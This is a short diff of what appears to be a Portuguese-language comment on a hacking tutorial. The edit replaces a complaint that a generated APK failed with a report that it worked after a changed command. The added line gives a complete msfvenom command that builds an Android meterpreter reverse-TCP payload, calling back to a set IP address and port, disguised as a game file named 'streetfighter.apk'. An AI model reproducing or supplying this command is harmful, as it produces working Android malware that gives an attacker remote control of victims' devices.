@@ -1,1 +1,1 @@
-Fiz em uma vm kali e tentei fazer mas o apk não funciona e não sei a acausa do erro tentei algumas vezes mas não deu certo segue imagens do que fiz.  
+Fiz em uma vm kali e deu certo mas tive que fazer um comando diferente do que ta no tutorial para cria o .apk direito. Este foi o comando "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=444 --platform android R > streetfighter.apk"
